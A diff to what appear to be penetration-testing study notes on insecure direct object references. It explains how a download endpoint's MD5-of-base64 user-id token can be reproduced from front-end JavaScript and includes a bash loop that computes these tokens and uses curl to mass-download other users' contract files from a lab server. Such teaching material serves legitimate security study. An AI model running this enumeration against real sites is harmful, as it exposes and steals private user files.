@@ -429,3 +429,75 @@ then with the payload we can see an id that returns the flag:
 
 ![](Images/Pasted%20image%2020240225175031.png)
 
+## Bypassing Encoded References 
+
+in our target if we click on the employee contract file to download a file we can capture the request: 
+
+![](Images/Pasted%20image%2020240226104513.png)
+
+when the request is sent we can get an encoded value like: 
+
+```php
+contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
+```
+
+using a some sort of download.php script to download files is common to avoid directly linking to files   
+
+in this example the app appears to be hashing the file with md5  
+we can try to calculate the hashes of values for things like uid, username, filename, etc.   
+
+we can use tools like `Burp comparer` to fuzz various values for the hash   
+in this example we can't seem to crack the hash leading us to think that it may contain a combination of values or a unique value that would make it a secure direct object reference 
+
+### Function disclosure 
+
+many developers may make the mistake of performing sensitive functions on the front-end   
+if the above hash was calculated on the front-end then we can study the function to replicate it  
+
+we can see in this app that it is calling the download contract function: 
+
+![](Images/Pasted%20image%2020240226105223.png)
+
+another example is: 
+
+```javascript
+function downloadContract(uid) {
+    $.redirect("/download.php", {
+        contract: CryptoJS.MD5(btoa(uid)).toString(),
+    }, "POST", "_self");
+}
+```
+
+in this case the user id will be base64 encoded then md5 hashed using the cryptojs library 
+
+we can test our own values to see if we can replicate the code: 
+
+```shell
+echo -n 1 | base64 -w 0 | md5sum
+```
+
+make sure to use `-n` and `-w 0` to avoid adding newlines 
+
+### Mass enumeration 
+
+we can create a script to encode and hash many values to try to enumerate other files: 
+
+```shell
+for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
+```
+
+```bash
+#!/bin/bash
+
+for i in {1..10}; do
+    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
+        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
+    done
+done
+```
+
+we can also so this in burp with payload processing to base64, hash, or urlencode our payloads: 
+
+![](Images/Pasted%20image%2020240226112335.png)
+
+
